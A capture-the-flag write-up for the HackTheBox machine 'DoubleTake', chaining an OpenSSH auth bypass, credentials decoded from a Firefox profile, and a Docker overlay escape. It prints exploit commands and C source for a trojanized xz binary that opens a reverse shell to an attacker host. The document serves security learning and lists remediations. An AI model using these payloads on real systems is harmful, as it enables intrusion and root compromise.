# HackTheBox — DoubleTake

> **Disclaimer** — Educational writeup of a controlled lab environment (HackTheBox). Flags have been replaced with `<FLAG_USER>` / `<FLAG_ROOT>` and the target IP with `<TARGET_IP>`. **Do not use these techniques against systems without explicit authorization.**

---


## Overview

**DoubleTake** is a Linux machine whose attack chain combines two distinct, recently disclosed (2026) vulnerabilities:

1. A **password authentication bypass flaw in OpenSSH** (`CVE-2026-123158`, nicknamed **"SSHole"**), specific to systems built against **musl libc without PAM** (such as Alpine Linux) — allows login with no valid credentials on accounts whose password hash isn't properly set.
2. A **Docker** flaw (`CVE-2026-41567`) that allows a decompression binary (`xz`) inside a container's *overlay filesystem* to be replaced with a malicious one — and that binary ends up being executed by the **Docker daemon, with host root privileges**, when the web application triggers a deploy operation that decompresses files.

Between the two main vulnerabilities, the chain also includes a lateral pivot through **credentials stored (in base64) in another system user's Firefox profile**.

| Stage | Vector |
|---|---|
| Initial access | CVE-2026-123158 ("SSHole") — SSH authentication bypass on the `alpine` user |
| Lateral pivot | Credentials found in `logins.json` (Firefox profile) → `bob` user |
| User flag | Read directly after gaining access as `bob` |
| Root privilege | CVE-2026-41567 — Docker overlay filesystem escape via `xz` binary replacement |

---

## Reconnaissance

```bash
nmap -Pn -sV -sC <TARGET_IP>
```

**Result:**

```text
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED
|_  Basic realm=Zentara
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Port Analysis

### Port 22 — SSH

Requires valid credentials for access — but, as we'll see, the installed version has a critical authentication-bypass vulnerability.

### Port 80 — HTTP

```bash
curl -I http://<TARGET_IP>:80
```

The application requires HTTP Basic authentication with the realm **"Zentara"**.

---

## Web Enumeration

Even without credentials, directory enumeration is possible — an unauthenticated request to an existing path still returns `401` (instead of `404`), which allows distinguishing real paths from non-existent ones:

```bash
gobuster dir -u http://<TARGET_IP>:80 \
  -w ~/SecLists/Discovery/Web-Content/common.txt \
  -x php,zip,txt
```

**Result:**

```text
agents    (Status: 401) [Size: 0]
deploy    (Status: 401) [Size: 0]
docs      (Status: 401) [Size: 0]
files     (Status: 401) [Size: 0]
settings  (Status: 401) [Size: 0]
status    (Status: 401) [Size: 0]
usage     (Status: 401) [Size: 0]
```

> **Note:** the `/deploy` endpoint will turn out to be crucial later on, during the privilege escalation stage via Docker.

---

## Identifying the SSH Vulnerability (SSHole)

The identified SSH service version (**OpenSSH 10.6**) was released shortly before this machine was discovered (October/November 2026). Researching recent vulnerabilities turned up:

> **[CVE-2026-123158](https://nvd.nist.gov/vuln/detail/CVE-2026-123158)** ("SSHole" — CVSS 8.1 High, listed on the **CISA KEV**): a password authentication bypass in `sshd`, on Linux systems built against **musl libc without PAM** (such as Alpine Linux). When musl's `crypt()` function rejects passwords larger than 256 bytes and returns `*` instead of a distinct error hash, that `*` can **accidentally match** accounts that have no valid password hash set (also internally represented as `*`), allowing unauthorized login. Actively exploited in the wild.

In short: the vulnerability exploits a flaw in how musl libc handles oversized passwords — instead of returning a clear error, it returns a value that, due to an implementation coincidence, is indistinguishable from the value marking "no password set" on certain system accounts.

---

## Exploitation — CVE-2026-123158 (SSHole)

### Getting the exploit

```bash
wget https://raw.githubusercontent.com/1dayexploit/1day-archive/main/analyses/cve-2026-123158-openssh-sshhole-auth-bypass/exploit.py
```

### First attempt — `root` account

```bash
python3 exploit.py --host <TARGET_IP>
```

**Result:**

```text
[STEP 1] Target account 'root' - probing password userauth
[STEP 2] Sending a 300-byte password twice on one connection
[STEP 3] Reading command output returned over the authenticated session

RESULT  : FAILURE
EVIDENCE: No bypass for 'root' - target may be patched, PAM/glibc build, or account field is not '*'.
```

The `root` account is not vulnerable — likely because it has a valid password hash set (rather than the `*` marker), or is otherwise protected (e.g., root password login disabled).

### Second attempt — `alpine` account

Since the web application referenced the "Zentara" realm and the underlying distro is typically associated with Alpine Linux (a musl-libc-based system, exactly the target of this CVE), the obvious username was tried:

```bash
python3 exploit.py --host <TARGET_IP> --username alpine
```

**Result:**

```text
[STEP 1] Target account 'alpine' - probing password userauth
[STEP 2] Sending a 300-byte password twice on one connection (NumberOfPasswordPrompts=2) - first primes the borrowed salt, second is accepted
[STEP 3] Reading command output returned over the authenticated session

COMMAND OUTPUT: uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)

RESULT  : SUCCESS
EVIDENCE: Auth bypass as 'alpine' with no credential
```

**Bypass confirmed.** The mechanism, in short: the exploit sends the same password (longer than 300 bytes) **twice over the same connection** — the first attempt "primes" the salt borrowed from musl's faulty implementation, and the second attempt is accepted, because the comparison result coincides with the "no password" marker on the `alpine` account.

### Confirming command execution

```bash
python3 exploit.py --host <TARGET_IP> --username alpine --command "whoami"
# alpine

python3 exploit.py --host <TARGET_IP> --username alpine --command "ls -la"
# total 16
# drwxr-sr-x  alpine alpine  .mozilla
```

---

## Manual SSH Access

Instead of relying solely on one-off command execution by the exploit, the bypass can be replicated directly with the standard `ssh` client:

```bash
ssh alpine@<TARGET_IP>
```

> **Process note:** on the first password prompt, just enter any single character (the connection is intentionally discarded). On the second prompt, paste a 300-character string of `A`s, generated with:
>
> ```bash
> python3 -c 'print("A" * 300)'
> ```
>
> According to the vulnerability details, this second attempt typically results in a successful login.

### Confirming access

```bash
id
# uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)

whoami
# alpine

ls -la
# drwxr-sr-x  alpine alpine  .mozilla
```

---

## Finding Credentials in the Firefox Profile

The presence of a `.mozilla` directory in `alpine`'s `$HOME` suggests this user used Firefox on the system — a common pattern in admin/deploy environments that access web panels through a local browser.

```bash
cd ~/.mozilla/firefox/zentara.default
ls -la
```

```text
cert9.db   key4.db   logins.json   pkcs11.txt   prefs.js   signedInUser.json
```

The **`logins.json`** file normally stores credentials saved by Firefox's password manager, encrypted using the keys in `key4.db`. In this specific lab scenario, however, the values turned out to be only **Base64-encoded**, with no real encryption applied:

```bash
cat logins.json
```

```json
{
  "logins": [{
    "hostname": "*********",
    "httpRealm": "*****",
    "encryptedUsername": "****",
    "encryptedPassword": "*********************"
  }]
}
```

### Decoding the credentials

```bash
echo **** | base64 -d


echo ********************* | base64 -d
# CorrectHorseBatteryStaple
```

> **Note:** `CorrectHorseBatteryStaple` is a direct reference to the famous *xkcd #936* webcomic strip, about the strength of memorable-phrase-based passwords — used here, ironically, as an actual, predictable password.

---

## Pivoting to the `bob` User

```bash
ssh bob@<TARGET_IP>
# password: CorrectHorseBatteryStaple
```

---

## User Flag

```bash
ls
# user.txt

cat user.txt
```

**Result:** `<FLAG_USER>`

---

## Accessing the Zentara Web Application

With `bob`'s credentials confirmed, it's possible to return to the web application that required HTTP Basic authentication:

```bash
curl -u ***:*************** http://<TARGET_IP>:80/
```

The login succeeds, revealing a platform called **"Zentara"** — apparently, an agent/container deployment management interface (consistent with the `/agents`, `/deploy`, `/files` endpoints found during initial enumeration).

---

## Privilege Escalation — CVE-2026-41567 (Docker Overlay Escape)

With machine access, enumerating the environment revealed **Docker 29.5.0**, a version affected by **[CVE-2026-41567](https://nvd.nist.gov/vuln/detail/CVE-2026-41567)**.

### The vulnerability, explained

This flaw allows a decompression binary (in this case, `xz`) used by the container's **overlay filesystem** to be **replaced** with a malicious one — and when the Docker daemon (running with host root privileges) processes a decompression operation that invokes that binary, it ends up **executing the attacker's payload directly on the host**, not just inside the isolated container.

In short, the attacker manages to make the host "trust" a binary that it actually controls — a classic container escape through the trust chain of the decompression operation.

### Step 1 — Compiling the trojanized `xz` binary

```c
// xz.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
        "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1", NULL);
    return 1;
}
```

> **What this code does:** it mounts `/proc` inside the current process, then uses `chroot("/proc/1/root")` to "jump" into the filesystem root seen by **PID 1** — which, in a Docker container's context, normally corresponds to the **host**, not the isolated container. After `chroot`-ing there, it executes a `bash` reverse shell, now running outside the container's isolation.

### Compiling as a static binary

To run inside an Alpine container (with limited dependencies), it's compiled statically, using Docker itself as the build environment:

```bash
docker run --rm --platform linux/amd64 -v "$(pwd)":/src -w /src alpine sh -c \
  "apk add --no-cache gcc musl-dev && gcc -static -no-pie -s -o xz xz.c"
```

### Step 2 — Packaging the malicious `.tar`

The goal is that, when Zentara decompresses this archive inside the container's root directory (`/`), the original `/usr/bin/xz` binary gets **overwritten** by our malicious version:

```bash
mkdir -p payload/usr/bin
cp xz payload/usr/bin/xz
chmod +x payload/usr/bin/xz
tar -cf payload.tar -C payload usr/bin/xz
```

### Step 3 — Triggering the deploy

The `/deploy` endpoint, identified early during web enumeration, accepts a file upload and a workspace path:

```bash
curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@payload.tar' \
  -F 'workspace=/' \
  http://<TARGET_IP>/deploy
```

This replaces `/usr/bin/xz` inside the container with our malicious binary.

### Step 4 — Setting up the listener

Before triggering anything, a local listener was set up to catch the reverse shell defined inside the trojanized `xz` binary:

```bash
nc -lvnp <PORT>
```

### Step 5 — Generating the trigger archive

With `xz` already replaced inside the container, the next step is to make Zentara invoke it. A second upload — this time a genuine `.tar.xz` archive — causes the application to run its own decompression logic, which calls out to the (now trojanized) `xz` binary to decompress it.

A minimal, harmless-looking archive is enough to trigger that call:

```bash
echo x > t && tar cf - t | xz > trigger.tar.xz
```

> This creates a throwaway file `t`, wraps it in a `tar` stream, and pipes it through `xz` to produce a valid `.tar.xz` archive. The content of `t` is irrelevant — the archive only needs to be valid enough that Zentara attempts to decompress it, which is exactly the moment the malicious `/usr/bin/xz` binary gets executed instead of the real one.

### Step 6 — Uploading the trigger archive

```bash
curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@trigger.tar.xz' \
  -F 'workspace=/' \
  http://<TARGET_IP>/deploy
```

### Step 7 — Catching the shell

**Result:** as soon as the upload completes, the listener set up in Step 4 receives a reverse shell with **host root** privileges (confirmed by `chroot("/proc/1/root")` having "escaped" the container to the system's real root).

---

## Root Flag

```bash
cat /root/root.txt
```

**Result:** `<FLAG_ROOT>`

---

## Lessons Learned

- **Subtle bugs in low-level C libraries** (such as musl libc's `crypt()` implementation) can have serious, unexpected security implications in layers far above them (SSH authentication), even with no apparent configuration error in the application itself.
- **System accounts with no password set** (internally marked as `*`) should always be configured with `nologin` / `PermitRootLogin no` / appropriate shell restrictions — never rely solely on the absence of a hash to block access.
- **Browser profiles (Firefox, Chrome) on servers** are an underrated lateral-pivot vector — files like `logins.json`, saved history and cookies can contain credentials for other systems.
- **"Memorable" but predictable passwords** (such as direct references to well-known memes/webcomics) remain a common weakness, even when they follow good length practices.
- **Decompression operations in automated deploy pipelines** (CI/CD, agent platforms) are a critical container-escape vector when the decompression binary itself can be replaced by the user before being invoked by the privileged process.

---

## Remediation

| Issue | Fix |
|---|---|
| CVE-2026-123158 (SSHole) | Upgrade OpenSSH to a patched version; on musl-libc systems, ensure `sshd` is built with PAM, or apply the upstream patch fixing `crypt()`'s handling of oversized passwords |
| Accounts with `*` password hash | Ensure service accounts with no real password have `PasswordAuthentication no` explicitly configured, or use key-only authentication |
| Credentials in browser profiles | Never store production system credentials in a browser's password manager on a server; use dedicated secrets vaults |
| CVE-2026-41567 (Docker overlay) | Upgrade Docker to a patched version; never let uploads from not-fully-trusted users be decompressed directly by processes with access to the host filesystem; isolate build/deploy pipelines in fully sandboxed environments |
| `/deploy` endpoint with no content validation | Strictly validate uploaded file contents before any decompression operation; never trust a file's name/extension as a guarantee of its actual content |

---

## Tools Used

- `nmap` — port and service reconnaissance
- `gobuster` — directory enumeration
- Public exploit for CVE-2026-123158 ("SSHole")
- `ssh` — manual access replicating the authentication bypass
- `base64` — decoding credentials found in the Firefox profile
- `curl` — authenticated interaction with the Zentara web application
- `gcc` (static compilation) + Docker — building the trojanized `xz` binary
- `tar` — packaging the malicious payload
- `netcat` — listener for the final reverse shell

---


